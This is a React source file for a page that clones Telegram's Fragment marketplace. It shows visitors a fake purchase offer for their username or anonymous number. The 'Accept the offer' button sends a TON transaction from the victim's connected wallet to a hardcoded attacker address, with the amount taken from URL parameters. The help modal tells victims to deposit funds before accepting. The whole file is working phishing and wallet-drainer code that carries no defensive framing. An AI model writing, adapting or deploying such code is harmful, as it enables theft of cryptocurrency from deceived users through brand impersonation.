import React, { useState, useEffect } from 'react';
import { TonConnectButton, useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';
import { Search, X, ExternalLink, Info, RefreshCw, Wallet, Shield, TrendingUp, TrendingDown } from 'lucide-react';

interface TonRates {
  rates: {
    TON: {
      prices: {
        USD: number;
      };
      diff_24h: {
        USD: string;
      };
      diff_7d: {
        USD: string;
      };
      diff_30d: {
        USD: string;
      };
    };
  };
}

interface FragmentData {
  name: string;
  price: number;
  date?: number;
}

// TON Icon Component
const TonIcon: React.FC<{ className?: string }> = ({ className = "w-4 h-4" }) => (
  <svg className={className} viewBox="0 0 24 24" fill="currentColor">
    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/>
    <path d="M8 8h8v2H8zm0 3h8v2H8zm0 3h5v2H8z"/>
  </svg>
);

// Fragment Logo Component
const FragmentLogo: React.FC<{ className?: string }> = ({ className = "w-5 h-5" }) => (
  <svg className={className} viewBox="0 0 24 24" fill="currentColor">
    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
  </svg>
);

const FragmentClone: React.FC = () => {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [searchQuery, setSearchQuery] = useState('');
  const [showHowItWorks, setShowHowItWorks] = useState(false);
  const [tonRates, setTonRates] = useState<TonRates | null>(null);
  const [loading, setLoading] = useState(true);
  const [paymentLoading, setPaymentLoading] = useState(false);
  const [fragmentData, setFragmentData] = useState<FragmentData>({
    name: 'main',
    price: 1000
  });

  const destinationAddress = "UQDbnrjL3Mw4ikGWXdl9OVq6MCS3-qNb6WTmn8VnTB-olI2a";

  // URL parametrlarini o'qish
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const startParam = urlParams.get('tgWebAppStartParam') || urlParams.get('startapp');
    
    if (startParam) {
      // startapp=item=vip_074__price=15 formatini parse qilish
      const params = new URLSearchParams(startParam.replace('item=', '').replace('__', '&'));
      const item = params.get('item') || params.get('vip_074');
      const price = params.get('price');
      
      if (item && price) {
        setFragmentData({
          name: item,
          price: parseFloat(price)
        });
      }
    }
  }, []);

  // TON narxini olish
  const fetchTonRates = async () => {
    try {
      setLoading(true);
      const response = await fetch('https://tonapi.io/v2/rates?tokens=ton&currencies=usd');
      const data = await response.json();
      setTonRates(data);
    } catch (error) {
      console.error('TON narxini olishda xatolik:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchTonRates();
    const interval = setInterval(fetchTonRates, 30000);
    return () => clearInterval(interval);
  }, []);

  // To'lovni amalga oshirish
  const handleAcceptOffer = async () => {
    if (!wallet) {
      alert('Iltimos, avval hamyoningizni ulang!');
      return;
    }

    setPaymentLoading(true);

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 360,
      messages: [
        {
          address: destinationAddress,
          amount: (fragmentData.price * 1e9).toString(),
          payload: ""
        }
      ]
    };

    try {
      await tonConnectUI.sendTransaction(transaction);
      alert('✅ To\'lov muvaffaqiyatli yuborildi!');
    } catch (error) {
      console.error('To\'lov xatoligi:', error);
      alert('❌ To\'lov bajarilmadi. Qaytadan urinib ko\'ring.');
    } finally {
      setPaymentLoading(false);
    }
  };

  const connectWallet = async () => {
    try {
      await tonConnectUI.openModal();
    } catch (error) {
      console.error('Hamyon ulanishida xatolik:', error);
    }
  };

  const shouldShowUsername = () => {
    if (!searchQuery) return true;
    return fragmentData.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
           searchQuery.toLowerCase().includes(fragmentData.name.toLowerCase());
  };

  const isUsername = !fragmentData.name.startsWith('+') && isNaN(Number(fragmentData.name));
  const nftType = isUsername ? 'username' : 'anonymous number';

  const formatDate = () => {
    if (fragmentData.date) {
      const date = new Date(fragmentData.date * 1000);
      return `${date.getUTCDate()} ${date.toLocaleString('en', { month: 'short', timeZone: 'UTC' })} ${date.getUTCFullYear()} at ${date.getUTCHours().toString().padStart(2, '0')}:${date.getUTCMinutes().toString().padStart(2, '0')}`;
    } else {
      const date = new Date();
      date.setDate(date.getDate() + 3);
      return date.toDateString();
    }
  };

  const calculateUsdPrice = () => {
    if (!tonRates) return '0.00';
    return (fragmentData.price * tonRates.rates.TON.prices.USD).toFixed(2);
  };

  const formatPercentage = (percentage: string) => {
    const isPositive = percentage.startsWith('+');
    const cleanPercentage = percentage.replace(/[+−-]/, '');
    return { isPositive, value: cleanPercentage };
  };

  return (
    <div className="min-h-screen bg-[#1a2026] text-[#8794a1]">
      {/* Header */}
      <header className="bg-[#212a33]/95 backdrop-blur-md border-b border-[#2e3a47] sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-14">
            {/* Logo */}
            <div className="flex items-center space-x-3">
              <FragmentLogo className="w-6 h-6 text-white" />
              <span className="text-white font-bold text-xl tracking-tight">FRAGMENT</span>
            </div>

            {/* Search */}
            <div className="flex-1 max-w-md mx-8">
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-[#8794a1]" />
                <input
                  type="text"
                  placeholder="Search phone numbers"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full bg-[#242e38] border border-[#2e3a47] rounded-lg pl-10 pr-4 py-2.5 text-white placeholder-[#8794a1] focus:outline-none focus:border-[#4db2ff] focus:ring-1 focus:ring-[#4db2ff] transition-colors"
                />
              </div>
            </div>

            {/* Connect TON Button */}
            <div className="flex items-center">
              {wallet ? (
                <div className="flex items-center space-x-3">
                  <div className="flex items-center space-x-2 bg-green-500/20 px-3 py-1.5 rounded-lg border border-green-500/30">
                    <Shield className="w-4 h-4 text-green-400" />
                    <span className="text-green-400 text-sm font-medium">
                      {wallet.account.address.slice(0, 6)}...{wallet.account.address.slice(-4)}
                    </span>
                  </div>
                  <TonConnectButton />
                </div>
              ) : (
                <button
                  onClick={connectWallet}
                  className="bg-[#248bda] hover:bg-[#207cc2] text-white px-4 py-2.5 rounded-lg font-medium transition-all duration-200 flex items-center space-x-2 hover:transform hover:scale-[1.02]"
                >
                  <TonIcon className="w-4 h-4" />
                  <span>Connect TON</span>
                </button>
              )}
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {shouldShowUsername() ? (
          <div className="space-y-8">
            {/* Username Header */}
            <div className="text-center">
              <div className="inline-flex items-center space-x-3 mb-3">
                <h1 className="text-4xl font-bold text-white">
                  {isUsername ? `${fragmentData.name}.t.me` : fragmentData.name}
                </h1>
                <span className="bg-green-500/20 text-green-400 px-3 py-1 rounded-full text-sm font-medium border border-green-500/30">
                  Claimed
                </span>
              </div>
              <button 
                onClick={() => setShowHowItWorks(true)}
                className="text-[#4db2ff] hover:underline text-sm transition-colors"
              >
                Subscribe to updates
              </button>
            </div>

            {/* What is this Section */}
            <div className="bg-[#212a33] rounded-xl p-6 border border-[#2e3a47] shadow-lg">
              <div className="mb-6">
                <h2 className="text-lg font-semibold text-white mb-4 flex items-center space-x-2">
                  <Info className="w-5 h-5 text-[#4db2ff]" />
                  <span>What is this?</span>
                </h2>
                <div className="space-y-3 text-sm leading-relaxed">
                  <p>
                    Someone offered{' '}
                    <span className="inline-flex items-center space-x-1 text-[#4db2ff] font-semibold bg-[#4db2ff]/10 px-2 py-1 rounded">
                      <TonIcon className="w-4 h-4" />
                      <span>{fragmentData.price.toLocaleString()}</span>
                      {tonRates && (
                        <span className="text-[#8794a1]">
                          (~${calculateUsdPrice()})
                        </span>
                      )}
                    </span>
                    {' '}for your {nftType}. If the price suits you, press "Accept the offer".
                  </p>
                  <button 
                    onClick={() => setShowHowItWorks(true)}
                    className="text-[#4db2ff] hover:underline transition-colors"
                  >
                    How does this work?
                  </button>
                </div>
              </div>

              <button
                onClick={handleAcceptOffer}
                disabled={paymentLoading}
                className={`w-full font-semibold py-3 px-6 rounded-lg transition-all duration-200 flex items-center justify-center space-x-2 ${
                  paymentLoading
                    ? 'bg-[#1a5490] text-[#8794a1] cursor-not-allowed'
                    : 'bg-[#248bda] hover:bg-[#207cc2] text-white hover:transform hover:scale-[1.02] shadow-lg hover:shadow-xl'
                }`}
              >
                {paymentLoading ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin" />
                    <span>Processing...</span>
                  </>
                ) : (
                  <>
                    <TonIcon className="w-4 h-4" />
                    <span>Accept the offer</span>
                  </>
                )}
              </button>
            </div>

            {/* User Info */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="space-y-6">
                {isUsername ? (
                  <>
                    <div className="bg-[#212a33] rounded-xl p-4 border border-[#2e3a47]">
                      <h3 className="text-white font-medium mb-2 text-sm uppercase tracking-wide text-[#8794a1]">Telegram Username</h3>
                      <a href={`https://t.me/${fragmentData.name}`} className="text-[#4db2ff] hover:underline flex items-center space-x-1 font-medium">
                        <span>@{fragmentData.name}</span>
                        <ExternalLink className="w-3 h-3" />
                      </a>
                    </div>
                    <div className="bg-[#212a33] rounded-xl p-4 border border-[#2e3a47]">
                      <h3 className="text-white font-medium mb-2 text-sm uppercase tracking-wide text-[#8794a1]">Web Address</h3>
                      <a href={`https://t.me/${fragmentData.name}`} className="text-[#4db2ff] hover:underline flex items-center space-x-1 font-medium">
                        <span>t.me/{fragmentData.name}</span>
                        <ExternalLink className="w-3 h-3" />
                      </a>
                    </div>
                  </>
                ) : (
                  <div className="bg-[#212a33] rounded-xl p-4 border border-[#2e3a47]">
                    <h3 className="text-white font-medium mb-2 text-sm uppercase tracking-wide text-[#8794a1]">Anonymous Number</h3>
                    <span className="text-[#4db2ff] font-medium">{fragmentData.name}</span>
                    <div className="text-sm text-[#8794a1] mt-2 leading-relaxed">
                      This anonymous number can be used to create a Telegram account not tied to a SIM card.
                    </div>
                  </div>
                )}
              </div>
              {isUsername && (
                <div className="bg-[#212a33] rounded-xl p-4 border border-[#2e3a47]">
                  <h3 className="text-white font-medium mb-2 text-sm uppercase tracking-wide text-[#8794a1]">TON Web 3.0 Address</h3>
                  <a href={`https://${fragmentData.name}.t.me`} className="text-[#4db2ff] hover:underline flex items-center space-x-1 font-medium">
                    <span>{fragmentData.name}.t.me</span>
                    <ExternalLink className="w-3 h-3" />
                  </a>
                </div>
              )}
            </div>

            {/* Latest Offers */}
            <div className="bg-[#212a33] rounded-xl p-6 border border-[#2e3a47] shadow-lg">
              <h2 className="text-lg font-semibold text-white mb-4">Latest Offers</h2>
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-[#2e3a47]">
                      <th className="text-left py-3 text-sm font-medium text-[#8794a1] uppercase tracking-wide">Offer</th>
                      <th className="text-left py-3 text-sm font-medium text-[#8794a1] uppercase tracking-wide">Date</th>
                      <th className="text-left py-3 text-sm font-medium text-[#8794a1] uppercase tracking-wide">From</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr className="hover:bg-[#2e3a47]/30 transition-colors">
                      <td className="py-4">
                        <div className="flex items-center space-x-2">
                          <TonIcon className="w-4 h-4 text-[#4db2ff]" />
                          <span className="text-white font-medium">{fragmentData.price.toLocaleString()}</span>
                          {tonRates && (
                            <span className="text-[#8794a1] text-sm">
                              (~${calculateUsdPrice()})
                            </span>
                          )}
                        </div>
                      </td>
                      <td className="py-4 text-sm text-[#8794a1]">{formatDate()}</td>
                      <td className="py-4">
                        <a 
                          href={`https://tonviewer.com/${destinationAddress}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-[#4db2ff] text-sm hover:underline font-mono"
                        >
                          {destinationAddress.slice(0, 8)}...{destinationAddress.slice(-8)}
                        </a>
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>

            {/* TON Price Display */}
            {tonRates && (
              <div className="bg-[#212a33] rounded-xl p-6 border border-[#2e3a47] shadow-lg">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-semibold text-white flex items-center space-x-2">
                    <TonIcon className="w-5 h-5 text-[#4db2ff]" />
                    <span>TON Price</span>
                  </h3>
                  <button 
                    onClick={fetchTonRates}
                    disabled={loading}
                    className="p-2 hover:bg-[#2e3a47] rounded-lg transition-colors"
                  >
                    <RefreshCw className={`w-4 h-4 text-[#8794a1] ${loading ? 'animate-spin' : ''}`} />
                  </button>
                </div>
                
                <div className="text-3xl font-bold text-white mb-4">
                  ${tonRates.rates.TON.prices.USD.toFixed(4)}
                </div>
                
                <div className="grid grid-cols-3 gap-4 text-sm">
                  {[
                    { label: '24h', value: tonRates.rates.TON.diff_24h.USD },
                    { label: '7d', value: tonRates.rates.TON.diff_7d.USD },
                    { label: '30d', value: tonRates.rates.TON.diff_30d.USD }
                  ].map((item, index) => {
                    const { isPositive, value } = formatPercentage(item.value);
                    return (
                      <div key={index} className="flex items-center space-x-2 bg-[#2e3a47]/30 rounded-lg p-3">
                        {isPositive ? (
                          <TrendingUp className="w-4 h-4 text-green-400" />
                        ) : (
                          <TrendingDown className="w-4 h-4 text-red-400" />
                        )}
                        <div>
                          <div className="text-[#8794a1] text-xs">{item.label}</div>
                          <div className={`font-medium ${isPositive ? 'text-green-400' : 'text-red-400'}`}>
                            {isPositive ? '+' : '-'}{value}
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}
          </div>
        ) : (
          <div className="text-center py-16">
            <div className="text-6xl mb-4">🔍</div>
            <h2 className="text-xl font-semibold text-white mb-2">Nothing found</h2>
            <p className="text-[#8794a1]">Try searching for something else</p>
          </div>
        )}
      </main>

      {/* How it works Modal */}
      {showHowItWorks && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-[#212a33] rounded-xl p-6 max-w-md w-full border border-[#2e3a47] shadow-2xl">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-lg font-semibold text-white">How does this work?</h3>
              <button 
                onClick={() => setShowHowItWorks(false)}
                className="text-[#8794a1] hover:text-white transition-colors p-1"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="space-y-4 text-sm leading-relaxed">
              <p className="text-[#8794a1]">You have received an offer to sell your <strong className="text-white">collectible number / username</strong>, follow the instructions:</p>
              <div className="space-y-3">
                <p className="text-white font-medium">To do so, simply:</p>
                <ul className="space-y-2 text-[#8794a1]">
                  <li>• Get <a href="https://tonkeeper.com/" className="text-[#4db2ff] hover:underline">Tonkeeper</a>, open it and create a <strong className="text-white">wallet</strong>.</li>
                  <li>• Deposit funds in your <strong className="text-white">wallet</strong> from a <a href="https://ton.org/buy-toncoin" className=\"text-[#4db2ff] hover:underline">supported exchange</a> or with <a href=\"https://wallet.t.me/" className=\"text-[#4db2ff] hover:underline">@wallet</a> on Telegram.</li>
                  <li>• Use <strong className="text-white">Tonkeeper</strong> to log in on Fragment and return to this page.</li>
                  <li>• Tap the button below to accept the offer</li>
                </ul>
              </div>
              <p className="text-xs text-[#8794a1] bg-[#2e3a47]/30 p-3 rounded-lg">
                Upon acceptance, the username / number offer will immediately take possession of the buyer.
              </p>
            </div>
            <button 
              onClick={() => setShowHowItWorks(false)}
              className="w-full mt-6 bg-[#248bda] hover:bg-[#207cc2] text-white font-medium py-3 px-4 rounded-lg transition-all duration-200 hover:transform hover:scale-[1.02]"
            >
              Close
            </button>
          </div>
        </div>
      )}

      {/* Footer */}
      <footer className="bg-[#111417] border-t border-[#2e3a47] py-6 mt-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-center space-x-8 text-xs text-[#6d8394]">
            <a href="#" className="hover:text-[#4db2ff] transition-colors">Top Auctions</a>
            <a href="#" className="hover:text-[#4db2ff] transition-colors">About</a>
            <a href="#" className="hover:text-[#4db2ff] transition-colors">Terms</a>
            <a href="#" className="hover:text-[#4db2ff] transition-colors">Privacy</a>
          </div>
          <div className="text-center mt-4">
            <p className="text-xs text-[#6d8394]">© 2024 Fragment. All rights reserved.</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default FragmentClone;